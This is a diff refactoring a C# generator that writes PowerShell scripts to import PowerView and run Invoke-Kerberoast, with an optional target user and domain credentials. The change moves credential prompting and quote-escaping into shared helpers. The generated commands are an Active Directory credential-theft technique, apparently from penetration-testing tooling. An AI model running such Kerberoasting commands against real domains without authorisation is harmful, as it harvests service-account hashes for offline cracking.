@@ -31,18 +31,16 @@ public static class KerberoastGenerator
 
         if (useCredential)
         {
-            lines.Add("$SecPassword = Read-Host \"Credential password\" -AsSecureString");
-            lines.Add($"$Cred = New-Object System.Management.Automation.PSCredential('{Ps(domain)}\\{Ps(username)}', $SecPassword)");
-            lines.Add("");
+            lines.AddRange(GeneratorHelpers.SecureCredentialBlock(domain, username));
         }
 
-        lines.Add("Import-Module .\\PowerView.ps1");
+        lines.Add(GeneratorHelpers.PowerViewImport);
         lines.Add("");
 
         string command = $"Invoke-Kerberoast -OutputFormat {outputFormat}";
         if (targetUser.Length > 0)
         {
-            command += $" -Identity '{Ps(targetUser)}'";
+            command += $" -Identity '{GeneratorHelpers.EscapeSingleQuotes(targetUser)}'";
         }
         if (useCredential)
         {
@@ -86,7 +84,4 @@ public static class KerberoastGenerator
 
         return string.Join("\r\n", lines);
     }
-
-    // Escape single quotes so a value can't break out of a PowerShell single-quoted string.
-    private static string Ps(string value) => value.Replace("'", "''");
 }
